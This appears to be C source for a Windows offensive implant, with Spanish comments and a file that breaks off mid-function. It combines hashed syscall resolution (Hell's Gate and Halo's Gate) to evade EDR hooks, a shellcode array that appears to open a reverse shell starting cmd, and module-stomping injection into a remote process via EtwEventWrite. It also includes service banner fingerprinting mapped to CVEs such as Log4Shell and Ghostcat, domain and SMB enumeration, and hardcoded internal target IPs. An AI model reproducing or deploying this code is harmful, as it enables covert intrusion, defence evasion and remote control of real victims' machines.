#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <wininet.h>
#include <wincred.h>
#include <lmcons.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "credui.lib")
#include <lm.h>
#include <dsgetdc.h>
#include <dsrole.h>

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "mpr.lib")

#define TARGET_PROCESS L"explorer.exe"
#define PAYLOAD_KEY    0xDEADC0DE

// HCG Infrastructure Constants
#define DC_IP L"10.2.1.1"
#define MULTIAPP_IP L"10.2.1.140"
#define SIGMA_IP L"10.2.1.139"
#define SE_IMPERSONATE_NAME TEXT("SeImpersonatePrivilege")

typedef struct _TARGET_HOST {
    WCHAR szIpAddress[16];
    BOOL bSmbAccessible;
    BOOL bRdpAccessible;
    BOOL bMorphoAccessible;
    BOOL bTomcatAjpAccessible;
    BOOL bLog4ShellVuln;
    BOOL bPhpFpmVuln;
    BOOL bApacheRewriteVuln;
    BOOL bBacnetVuln;
    BOOL bSigRedVuln;
    BOOL bAspNetSmugglingVuln;
    BOOL bSsrfNtlmVuln;
} TARGET_HOST, *PTARGET_HOST;

typedef struct _SERVICE_INFO {
    WORD port;
    char banner[256];
    char technology[64];
    int potential_cve_type; // 1=Ghostcat, 2=Thrift, 3=Log4Shell, 4=PHP-FPM, 5=mod_rewrite, 6=BACnet, 7=Morpho
} SERVICE_INFO, *PSERVICE_INFO;

#define MAX_DETECTED_SERVICES 100
extern SERVICE_INFO g_DetectedServices[MAX_DETECTED_SERVICES];
extern int g_NumDetectedServices;

typedef struct _VX_TABLE_ENTRY {
    PVOID pAddress;
    DWORD64 dwHash;
    WORD wID;
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtWriteVirtualMemory;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtOpenProcess;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtOpenThread;
    VX_TABLE_ENTRY NtQueueApcThread;
    VX_TABLE_ENTRY NtClose;
} VX_TABLE, *PVX_TABLE;

__forceinline DWORD hash_ansi_optimized(const char* str) {
    DWORD hash = 0x8200BEEF; 
    int c;

    while ((c = *str++)) {
        // Convertir a lowercase manualmente (más rápido que tolower)
        if (c >= 'A' && c <= 'Z') {
            c = c + ('a' - 'A'); // 32
        }
        hash = ((hash << 5) + hash) + c; // hash * 33 + c
    }
    return hash;
}

// Función de verificación de hashes (para debugging)
#ifdef _DEBUG
void VerifyHashes() {
    // Verificar que los hashes coinciden con los nombres esperados
    struct { const char* name; DWORD hash; } hashTable[] = {
        { "NtOpenProcess", 0xD78326E2 },
        { "NtWriteVirtualMemory", 0x3D601EFC },
        { "NtProtectVirtualMemory", 0x81EF4CB2 },
        { "NtOpenThread", 0xB211EF1B },
        { "NtQueueApcThread", 0x309B84A2 },
        { "NtClose", 0xD8CDDA27 },
        { "EtwEventWrite", 0xE4DF2AAC },
        { NULL, 0 }
    };
    
    for (int i = 0; hashTable[i].name; i++) {
        DWORD calc = hash_ansi_optimized(hashTable[i].name);
        printf("[HASH] %s: Calculado=0x%08X, Esperado=0x%08X %s\n",
            hashTable[i].name, calc, hashTable[i].hash,
            calc == hashTable[i].hash ? "OK" : "FALLA");
    }
}
#endif

// Función auxiliar para validar que el puntero está dentro del módulo
BOOL IsValidPEData(PVOID pModuleBase, PBYTE pAddress) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModuleBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pDos->e_lfanew);
    DWORD dwSize = pNt->OptionalHeader.SizeOfImage;
    return (pAddress >= (PBYTE)pModuleBase && pAddress < (PBYTE)pModuleBase + dwSize);
}

WORD GetSyscallNumber(PVOID pModuleBase, DWORD dwProcedureHash) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + 
        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinal = (PWORD)((PBYTE)pModuleBase + pExportDirectory->AddressOfNameOrdinals);

    for (WORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
        const char* szFunctionName = (const char*)((PBYTE)pModuleBase + pdwAddressOfNames[i]);
        
        if (hash_ansi_optimized(szFunctionName) == dwProcedureHash) {
            PBYTE pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinal[i]];
            
            // Hell's Gate: Patrones de prólogo de syscall
            for (WORD cw = 0; cw < 32; cw++) {
                // Patrón 1: mov r10, rcx; mov eax, SSN; syscall; ret (Windows 10/11 estándar)
                if (*(pFunctionAddress + cw) == 0x4C && *(pFunctionAddress + cw + 1) == 0x8B && 
                    *(pFunctionAddress + cw + 2) == 0xD1 && *(pFunctionAddress + cw + 3) == 0xB8) {
                    WORD wSyscall = *(PWORD)(pFunctionAddress + cw + 4);
                    // Validar que sea un SSN razonable
                    if (wSyscall > 0 && wSyscall < 0x2000) return wSyscall;
                }
                
                // Patrón 2: mov eax, SSN (directo, algunas variantes)
                if (*(pFunctionAddress + cw) == 0xB8) {
                    // Verificar que siga syscall o ret cerca
                    for (WORD k = 5; k < 24 && (cw + k) < 32; k++) {
                        if (*(pFunctionAddress + cw + k) == 0x0F && *(pFunctionAddress + cw + k + 1) == 0x05) {
                            DWORD dwSyscall = *(PDWORD)(pFunctionAddress + cw + 1);
                            if (dwSyscall > 0 && dwSyscall < 0x2000) return (WORD)dwSyscall;
                        }
                    }
                }
            }

            // Halo's Gate: Función hookeada, buscar en vecinos
            BYTE bFirstByte = *pFunctionAddress;
            if (bFirstByte == 0xE9 || bFirstByte == 0xC3 || bFirstByte == 0x48 || 
                bFirstByte == 0xFF || bFirstByte == 0xEB) {
                
                // Buscar en funciones cercanas (32 bytes de separación típica)
                for (WORD idx = 1; idx <= 600; idx++) {
                    // Vecino Superior (direcciones mayores)
                    PBYTE pNeighborAbove = pFunctionAddress + (idx * 32);
                    if (IsValidPEData(pModuleBase, pNeighborAbove)) {
                        for (WORD cw = 0; cw < 32; cw++) {
                            if (*(pNeighborAbove + cw) == 0x4C && *(pNeighborAbove + cw + 1) == 0x8B && 
                                *(pNeighborAbove + cw + 2) == 0xD1 && *(pNeighborAbove + cw + 3) == 0xB8) {
                                WORD wNeighborSSN = *(PWORD)(pNeighborAbove + cw + 4);
                                WORD wCalculated = wNeighborSSN - idx;
                                if (wCalculated > 0 && wCalculated < 0x2000) return wCalculated;
                            }
                        }
                    }
                    
                    // Vecino Inferior (direcciones menores)
                    PBYTE pNeighborBelow = pFunctionAddress - (idx * 32);
                    if (IsValidPEData(pModuleBase, pNeighborBelow)) {
                        for (WORD cw = 0; cw < 32; cw++) {
                            if (*(pNeighborBelow + cw) == 0x4C && *(pNeighborBelow + cw + 1) == 0x8B && 
                                *(pNeighborBelow + cw + 2) == 0xD1 && *(pNeighborBelow + cw + 3) == 0xB8) {
                                WORD wNeighborSSN = *(PWORD)(pNeighborBelow + cw + 4);
                                WORD wCalculated = wNeighborSSN + idx;
                                if (wCalculated > 0 && wCalculated < 0x2000) return wCalculated;
                            }
                        }
                    }
                }
            }
            return 0;
        }
    }
    return 0;
}

unsigned char encrypted_payload[] = {
    0x48,0x31,0xd2,0x65,0x48,0x8b,0x42,0x60,0x48,0x8b,0x70,0x18,0x48,0x8b,0x76,0x10,
    0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,0x7e,0x30,0xb2,0x88,0x8b,0x5f,0x3c,0x48,0x01,
    0xfb,0x8b,0x1c,0x13,0x48,0x01,0xfb,0x44,0x8b,0x73,0x1c,0x49,0x01,0xfe,0x66,0xba,
    0xfc,0x0c,0x41,0x8b,0x1c,0x16,0x48,0x01,0xfb,0x48,0x31,0xd2,0x52,0x52,0xc7,0x04,
    0x24,0x77,0x73,0x32,0x5f,0xc7,0x44,0x24,0x04,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x48,
    0x8d,0x0c,0x24,0x48,0x83,0xec,0x58,0xff,0xd3,0x48,0x83,0xc4,0x68,0x48,0x89,0xc6,
    0x48,0x31,0xdb,0x48,0x31,0xd2,0xb2,0x88,0x8b,0x5e,0x3c,0x48,0x01,0xf3,0x8b,0x1c,
    0x13,0x48,0x01,0xf3,0x44,0x8b,0x7b,0x1c,0x49,0x01,0xf7,0x48,0x31,0xd2,0x66,0xba,
    0xc8,0x01,0x41,0x8b,0x1c,0x17,0x48,0x01,0xf3,0x66,0xba,0x98,0x01,0x48,0x29,0xd4,
    0x48,0x8d,0x14,0x24,0x48,0x31,0xc9,0x66,0xb9,0x02,0x02,0x48,0x83,0xec,0x58,0xff,
    0xd3,0x48,0x31,0xd2,0x48,0x83,0xec,0x58,0x48,0x89,0x54,0x24,0x20,0x48,0x89,0x54,
    0x24,0x28,0x48,0xff,0xc2,0x48,0x89,0xd1,0x48,0xff,0xc1,0x4d,0x31,0xc0,0x49,0x83,
    0xc0,0x06,0x4d,0x31,0xc9,0x66,0x41,0xb9,0x88,0x01,0x43,0x8b,0x1c,0x0f,0x48,0x01,
    0xf3,0x4d,0x31,0xc9,0xff,0xd3,0x49,0x89,0xc5,0x4d,0x31,0xc0,0x41,0x50,0x41,0x50,
    0xc6,0x04,0x24,0x02,0x66,0xc7,0x44,0x24,0x02,0x11,0x5c,0xc7,0x44,0x24,0x04,0x80,
    0x0a,0xa8,0xc0,0x4c,0x8d,0x24,0x24,0x48,0x83,0xec,0x58,0x48,0x31,0xdb,0x41,0x8b,
    0x5f,0x0c,0x48,0x01,0xf3,0x4c,0x89,0xe2,0x4c,0x89,0xe9,0x41,0xb0,0x10,0xff,0xd3,
    0x4d,0x31,0xc0,0x4c,0x39,0xc0,0x75,0xe3,0x48,0x31,0xdb,0x41,0x8b,0x5e,0x40,0x48,
    0x01,0xfb,0xff,0xd3,0x48,0x31,0xd2,0x52,0x52,0xc7,0x04,0x24,0x75,0x73,0x65,0x72,
    0xc7,0x44,0x24,0x04,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x48,0x8d,0x0c,0x24,0x66,0xba,
    0xfc,0x0c,0x41,0x8b,0x1c,0x16,0x48,0x01,0xfb,0x48,0x83,0xec,0x58,0xff,0xd3,0x48,
    0x89,0xc6,0x48,0x31,0xdb,0x48,0x31,0xd2,0x66,0xba,0x4a,0x02,0x45,0x8b,0x24,0x96,
    0x49,0x01,0xfc,0x48,0x31,0xc9,0x51,0x51,0xc7,0x04,0x24,0x46,0x69,0x6e,0x64,0xc7,
    0x44,0x24,0x04,0x57,0x69,0x6e,0x64,0xc7,0x44,0x24,0x08,0x6f,0x77,0x41,0x41,0x80,
    0x74,0x24,0x0b,0x41,0x48,0x8d,0x14,0x24,0x48,0x89,0xf1,0x48,0x83,0xec,0x58,0x41,
    0xff,0xd4,0x48,0x31,0xd2,0x52,0x52,0x52,0xc7,0x04,0x24,0x43,0x6f,0x6e,0x73,0xc7,
    0x44,0x24,0x04,0x6f,0x6c,0x65,0x57,0xc7,0x44,0x24,0x08,0x69,0x6e,0x64,0x6f,0xc7,
    0x44,0x24,0x0c,0x77,0x43,0x6c,0x61,0x66,0x61,0x66,0xc7,0x44,0x24,0x10,0x73,0x73,
    0x48,0x8d,0x0c,0x24,0x48,0x83,0xec,0x58,0xff,0xd0,0x49,0x89,0xc7,0x48,0x31,0xd2,
    0x48,0x31,0xc9,0x51,0x51,0xc7,0x04,0x24,0x53,0x68,0x6f,0x77,0xc7,0x44,0x24,0x04,
    0x57,0x69,0x6e,0x64,0x66,0xc7,0x44,0x24,0x08,0x6f,0x77,0x48,0x8d,0x14,0x24,0x48,
    0x89,0xf1,0x48,0x83,0xec,0x58,0x41,0xff,0xd4,0x4c,0x89,0xf9,0x48,0x31,0xd2,0x48,
    0x83,0xec,0x58,0xff,0xd0,0x66,0xba,0x90,0x02,0x41,0x8b,0x1c,0x16,0x48,0x01,0xfb,
    0x48,0x83,0xec,0x68,0x48,0x83,0xec,0x18,0x4c,0x8d,0x24,0x24,0xb2,0x68,0x48,0x31,
    0xc9,0x41,0x89,0x14,0x24,0x49,0x89,0x4c,0x24,0x04,0x49,0x89,0x4c,0x24,0x0c,0x49,
    0x89,0x4c,0x24,0x14,0x49,0x89,0x4c,0x24,0x18,0x48,0x31,0xd2,0xb2,0xff,0x48,0xff,
    0xc2,0x41,0x89,0x54,0x24,0x3c,0x4d,0x89,0x6c,0x24,0x50,0x4d,0x89,0x6c,0x24,0x58,
    0x4d,0x89,0x6c,0x24,0x60,0x68,0x63,0x6d,0x64,0x41,0x88,0x54,0x24,0x03,0x48,0x8d,
    0x14,0x24,0x48,0xff,0xc1,0x48,0x83,0xec,0x58,0x48,0x89,0x4c,0x24,0x20,0x48,0x31,
    0xc9,0x4d,0x31,0xc0,0x4c,0x89,0x44,0x24,0x28,0x4c,0x89,0x44,0x24,0x30,0x4c,0x89,
    0x44,0x24,0x38,0x4d,0x8d,0x0c,0x24,0x4c,0x89,0x4c,0x24,0x40,0x4d,0x8d,0x4c,0x24,
    0x68,0x4c,0x89,0x4c,0x24,0x48,0x4d,0x31,0xc9,0xff,0xd3,0x48,0x31,0xd2,0x66,0xba,
    0xa0,0x04,0x41,0x8b,0x1c,0x16,0x48,0x01,0xfb,0x48,0x31,0xc9,0xff,0xd3
};

// --- NEW OFFENSIVE MODULES PROTOTYPES ---
BOOL DetectServiceTechnology(DWORD targetIp, PSERVICE_INFO pServiceInfo);
BOOL EnumerateDomainUsersAndGroups();
BOOL EnumerateSmbShares(const char* targetHost, const char* username, const char* password);
BOOL AttemptNtlmRelayOrKerberoasting();

// --- NEW OFFENSIVE MODULES ---

// Global storage for detected services
SERVICE_INFO g_DetectedServices[MAX_DETECTED_SERVICES];
int g_NumDetectedServices = 0;

/**
 * @brief Intenta identificar la tecnología/banners de un servicio.
 */
BOOL DetectServiceTechnology(DWORD targetIp, PSERVICE_INFO pServiceInfo) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return FALSE;

    struct sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(pServiceInfo->port);
    addr.sin_addr.s_addr = targetIp;

    // Timeout de 3 segundos
    struct timeval tv = { 3, 0 };
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));

    BOOL bResult = FALSE;
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        const char* probe = "GET / HTTP/1.0\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
        int sent = send(s, probe, (int)strlen(probe), 0);
        
        if (sent > 0) {
            char buffer[1024];
            ZeroMemory(buffer, sizeof(buffer)); // Inicializar todo a cero
            int bytes = recv(s, buffer, sizeof(buffer) - 1, 0); // Dejar espacio para null
            
            if (bytes > 0) {
                buffer[bytes] = '\0'; // Garantizar null-termination
                bResult = TRUE;
                
                // Copiar banner de forma segura
                strncpy_s(pServiceInfo->banner, sizeof(pServiceInfo->banner), buffer, _TRUNCATE);
                
                // Detección de tecnologías
                _strlwr_s(buffer, sizeof(buffer)); // Convertir a lowercase para comparación
                
                if (strstr(buffer, "apache/2.4.38") || strstr(buffer, "apache/2.4")) {
                    strcpy_s(pServiceInfo->technology, sizeof(pServiceInfo->technology), "Apache");
                    pServiceInfo->potential_cve_type = 5; // mod_rewrite
                } 
                else if (strstr(buffer, "coyote/") || strstr(buffer, "tomcat")) {
                    strcpy_s(pServiceInfo->technology, sizeof(pServiceInfo->technology), "Tomcat");
                    pServiceInfo->potential_cve_type = 1; // Ghostcat
                } 
                else if (strstr(buffer, "log4j") || strstr(buffer, "jndi")) {
                    strcpy_s(pServiceInfo->technology, sizeof(pServiceInfo->technology), "Log4j");
                    pServiceInfo->potential_cve_type = 3; // Log4Shell
                } 
                else if (strstr(buffer, "php") || strstr(buffer, "php-fpm")) {
                    strcpy_s(pServiceInfo->technology, sizeof(pServiceInfo->technology), "PHP");
                    pServiceInfo->potential_cve_type = 4; // PHP-FPM
                } 
                else if (strstr(buffer, "iis") || strstr(buffer, "microsoft-iis")) {
                    strcpy_s(pServiceInfo->technology, sizeof(pServiceInfo->technology), "IIS");
                    pServiceInfo->potential_cve_type = 2; // ASP.NET
                }
                else if (strstr(buffer, "nginx")) {
                    strcpy_s(pServiceInfo->technology, sizeof(pServiceInfo->technology), "Nginx");
                }
                else {
                    strcpy_s(pServiceInfo->technology, sizeof(pServiceInfo->technology), "Unknown");
                }
            }
        }
    }
    
    closesocket(s);
    return bResult;
}

/**
 * @brief Enumera usuarios y grupos del dominio si se está en un contexto de dominio.
 */
BOOL EnumerateDomainUsersAndGroups() {
    printf("[ENUM] Iniciando enumeración de dominio...\n");
    PDOMAIN_CONTROLLER_INFOW pdci = NULL;
    DWORD res = DsGetDcNameW(NULL, NULL, NULL, NULL, DS_DIRECTORY_SERVICE_REQUIRED, &pdci);

    if (res == ERROR_SUCCESS) {
        printf("[ENUM] DC Detectado: %ws (%ws)\n", pdci->DomainControllerName, pdci->DomainName);

        // Enumerar usuarios (simplificado para PoC)
        PUSER_INFO_0 pUserInfo = NULL;
        DWORD entriesRead = 0, totalEntries = 0, resumeHandle = 0;
        res = NetUserEnum(pdci->DomainControllerName, 0, FILTER_NORMAL_ACCOUNT, (LPBYTE*)&pUserInfo, MAX_PREFERRED_LENGTH, &entriesRead, &totalEntries, &resumeHandle);

        if (res == ERROR_SUCCESS || res == ERROR_MORE_DATA) {
            printf("[ENUM] Usuarios encontrados: %d de %d\n", entriesRead, totalEntries);
            for (DWORD i = 0; i < entriesRead; i++) {
                printf("[ENUM]   User: %ws\n", pUserInfo[i].usri0_name);
            }
            NetApiBufferFree(pUserInfo);
        }
        NetApiBufferFree(pdci);
        return TRUE;
    }
    printf("[ENUM] No se pudo localizar el DC.\n");
    return FALSE;
}

/**
 * @brief Enumera recursos compartidos SMB.
 */
BOOL EnumerateSmbShares(const char* targetHost, const char* username, const char* password) {
    printf("[ENUM] Enumerando recursos SMB en %s\n", targetHost);

    WCHAR szTarget[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, targetHost, -1, szTarget, MAX_PATH);

    PSHARE_INFO_1 pBuf = NULL;
    DWORD entriesRead = 0, totalEntries = 0, resumeHandle = 0;
    NET_API_STATUS res = NetShareEnum(szTarget, 1, (LPBYTE*)&pBuf, MAX_PREFERRED_LENGTH, &entriesRead, &totalEntries, &resumeHandle);

    if (res == NERR_Success) {
        printf("[ENUM] Recursos encontrados en %s:\n", targetHost);
        for (DWORD i = 0; i < entriesRead; i++) {
            printf("[ENUM]   Share: %ws (Tipo: %d)\n", pBuf[i].shi1_netname, pBuf[i].shi1_type);
        }
        NetApiBufferFree(pBuf);
        return TRUE;
    }
    printf("[ENUM] Error al enumerar recursos SMB: %d\n", res);
    return FALSE;
}

/**
 * @brief Placeholder para técnicas de post-compromiso.
 */
BOOL AttemptNtlmRelayOrKerberoasting() {
    printf("[POST-EX] Intentando NTLM Relay o Kerberoasting (Captura de Hash)...\n");
    // En una implementación real, esto interactuaría con MS-KILE o configuraría un listener.
    return TRUE;
}

/**
 * @brief Verifica el entorno actual para adaptar la estrategia de ataque.
 */
BOOL CheckEnvironment() {
    WCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerNameLen = MAX_COMPUTERNAME_LENGTH + 1;
    WCHAR userName[UNLEN + 1];
    DWORD userNameLen = UNLEN + 1;
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    BOOL bHasImpersonate = FALSE;

    GetComputerNameW(computerName, &computerNameLen);
    GetUserNameW(userName, &userNameLen);
    printf("[ENV] Computadora: %ws, Usuario: %ws\n", computerName, userName);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        bHasImpersonate = (GetLastError() == ERROR_SUCCESS);
        printf("[ENV] SeImpersonatePrivilege: %s\n", bHasImpersonate ? "SI" : "NO");
        CloseHandle(hToken);
    }

    return TRUE;
}

/**
 * @brief Intenta escalar privilegios si se dispone de SeImpersonatePrivilege.
 */
BOOL AttemptPrivilegeEscalation() {
    printf("[PE] Intentando escalada de privilegios vía SeImpersonatePrivilege...\n");
    // Vector: Token Impersonation (Placeholder logic for PrintSpoofer or similar)
    // En un entorno real, aquí se llamaría a la técnica específica.
    return TRUE;
}

/**
 * @brief Intenta escalada local explotando Apache (CVE-2019-0211) si el usuario es www-data.
 */
BOOL AttemptApacheEscalation() {
    WCHAR userName[UNLEN + 1];
    DWORD userNameLen = UNLEN + 1;
    GetUserNameW(userName, &userNameLen);

    // Si estamos corriendo como una cuenta de servicio web, intentar exploit
    if (_wcsicmp(userName, L"www-data") == 0 || _wcsicmp(userName, L"apache") == 0) {
        printf("[PE] Usuario web detectado (%ws). Intentando CVE-2019-0211 (Apache Escalation)...\n", userName);
        // Implementación real requeriría manipulación de memoria compartida de Apache (scoreboards).
        return TRUE;
    }
    return FALSE;
}

void XorDecrypt(PBYTE pData, SIZE_T sData, DWORD64 dwKey) {
    for (SIZE_T i = 0; i < sData; i++) {
        pData[i] ^= ((PBYTE)&dwKey)[i % 8];
    }
}

extern "C" NTSTATUS DirectSyscall(WORD wID, ...);

PVOID GetFunctionAddress(PVOID pModuleBase, DWORD dwProcedureHash) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinal = (PWORD)((PBYTE)pModuleBase + pExportDirectory->AddressOfNameOrdinals);

    for (WORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
        const char* szFunctionName = (const char*)((PBYTE)pModuleBase + pdwAddressOfNames[i]);
        if (hash_ansi_optimized(szFunctionName) == dwProcedureHash) {
            return (PVOID)((PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinal[i]]);
        }
    }
    return NULL;
}

PVOID GetRemoteModuleBase(DWORD dwPid, const wchar_t* szModuleName) {
    PVOID pModuleBase = NULL;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, dwPid);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        MODULEENTRY32W me = { sizeof(me) };
        if (Module32FirstW(hSnapshot, &me)) {
            do {
                if (_wcsicmp(me.szModule, szModuleName) == 0) {
                    pModuleBase = (PVOID)me.modBaseAddr;
                    break;
                }
            } while (Module32NextW(hSnapshot, &me));
        }
        CloseHandle(hSnapshot);
    }
    return pModuleBase;
}

// -------------------------------------------------------------------
// 5. Lógica de Inyección Evasiva: Module Stomping (ASLR Aware)
// -------------------------------------------------------------------
BOOL ModuleStompingInject(DWORD dwPid, PBYTE pPayload, SIZE_T sPayload) {
    VX_TABLE table = { 0 };
    HMODULE hNtdllLocal = GetModuleHandleA("ntdll.dll");
    
    // Hashes verificados para ntdll
    table.NtOpenProcess.dwHash = 0xD78326E2;        // "NtOpenProcess"
    table.NtWriteVirtualMemory.dwHash = 0x3D601EFC; // "NtWriteVirtualMemory"
    table.NtProtectVirtualMemory.dwHash = 0x81EF4CB2; // "NtProtectVirtualMemory"
    table.NtOpenThread.dwHash = 0xB211EF1B;         // "NtOpenThread"
    table.NtQueueApcThread.dwHash = 0x309B84A2;     // "NtQueueApcThread"
    table.NtClose.dwHash = 0xD8CDDA27;              // "NtClose"

    table.NtOpenProcess.wID = GetSyscallNumber(hNtdllLocal, table.NtOpenProcess.dwHash);
    table.NtWriteVirtualMemory.wID = GetSyscallNumber(hNtdllLocal, table.NtWriteVirtualMemory.dwHash);
    table.NtProtectVirtualMemory.wID = GetSyscallNumber(hNtdllLocal, table.NtProtectVirtualMemory.dwHash);
    table.NtOpenThread.wID = GetSyscallNumber(hNtdllLocal, table.NtOpenThread.dwHash);
    table.NtQueueApcThread.wID = GetSyscallNumber(hNtdllLocal, table.NtQueueApcThread.dwHash);
    table.NtClose.wID = GetSyscallNumber(hNtdllLocal, table.NtClose.dwHash);

    // Verificar que todos los SSN se resolvieron
    if (!table.NtOpenProcess.wID || !table.NtWriteVirtualMemory.wID || 
        !table.NtProtectVirtualMemory.wID || !table.NtOpenThread.wID ||
        !table.NtQueueApcThread.wID) {
        printf("[-] Error: No se pudieron resolver todos los syscalls\n");
        return FALSE;
    }

    printf("[+] Syscalls resueltos: Open=%d Write=%d Protect=%d\n",
        table.NtOpenProcess.wID, table.NtWriteVirtualMemory.wID, 
        table.NtProtectVirtualMemory.wID);

    // 1. Obtener dirección local de EtwEventWrite (función objetivo para stomping)
    PVOID pFuncLocal = GetFunctionAddress(hNtdllLocal, 0xE4DF2AAC); // EtwEventWrite hash
    if (!pFuncLocal) {
        printf("[-] No se pudo resolver EtwEventWrite\n");
        return FALSE;
    }

    // 2. Calcular RVA
    DWORD64 dwRva = (DWORD64)pFuncLocal - (DWORD64)hNtdllLocal;
    printf("[+] RVA de EtwEventWrite: 0x%llX\n", dwRva);

    // 3. Obtener base remota de ntdll
    PVOID pNtdllRemoteBase = GetRemoteModuleBase(dwPid, L"ntdll.dll");
    if (!pNtdllRemoteBase) {
        printf("[-] No se pudo encontrar ntdll.dll remoto\n");
        return FALSE;
    }

    // 4. Calcular dirección remota exacta
    PVOID pRemoteAddress = (PVOID)((DWORD64)pNtdllRemoteBase + dwRva);
    
    // Alinear a página para operaciones de protección
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    DWORD dwPageSize = si.dwPageSize;
    
    PVOID pAlignedAddress = (PVOID)(((DWORD64)pRemoteAddress + dwPageSize - 1) & ~(dwPageSize - 1));
    SIZE_T sAlignedSize = ((sPayload + dwPageSize - 1) & ~(dwPageSize - 1));
    
    // Si el payload cruza límites de página, ajustar
    if ((DWORD64)pRemoteAddress % dwPageSize != 0) {
        pAlignedAddress = (PVOID)((DWORD64)pRemoteAddress & ~(dwPageSize - 1));
        SIZE_T sOffset = (DWORD64)pRemoteAddress - (DWORD64)pAlignedAddress;
        sAlignedSize = ((sOffset + sPayload + dwPageSize - 1) & ~(dwPageSize - 1));
    }

    printf("[*] Dirección objetivo: 0x%p (Alineada: 0x%p, Tamaño: %zu)\n", 
        pRemoteAddress, pAlignedAddress, sAlignedSize);

    // Verificar tamaño del payload vs espacio disponible (estimado)
    if (sPayload > 4096) { // EtwEventWrite típicamente tiene espacio suficiente
        printf("[-] Payload demasiado grande (>4KB)\n");
        return FALSE;
    }

    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)dwPid, 0 };

    // Abrir proceso objetivo
    NTSTATUS status = DirectSyscall(table.NtOpenProcess.wID, &hProcess, PROCESS_VM_OPERATION | 
        PROCESS_VM_WRITE | PROCESS_VM_READ, &oa, &cid);
    if (status != 0 || !hProcess) {
        printf("[-] NtOpenProcess falló: 0x%X\n", status);
        return FALSE;
    }
    printf("[+] Handle de proceso: 0x%p\n", hProcess);

    // Cambiar protección a RW - usar dirección alineada
    PVOID pProtectAddr = pAlignedAddress;
    SIZE_T sProtectSize = sAlignedSize;
    ULONG ulOldProtect = 0;
    
    status = DirectSyscall(table.NtProtectVirtualMemory.wID, hProcess, &pProtectAddr, 
        &sProtectSize, PAGE_READWRITE, &ulOldProtect);
    if (status != 0) {
        printf("[-] NtProtectVirtualMemory (RW) falló: 0x%X\n", status);
        DirectSyscall(table.NtClose.wID, hProcess);
        return FALSE;
    }
    printf("[+] Protección cambiada a RW (anterior: 0x%X)\n", ulOldProtect);

    // Descifrar y escribir payload
    PBYTE pLocalPayload = (PBYTE)VirtualAlloc(NULL, sPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pLocalPayload) {
        DirectSyscall(table.NtProtectVirtualMemory.wID, hProcess, &pAlignedAddress, 
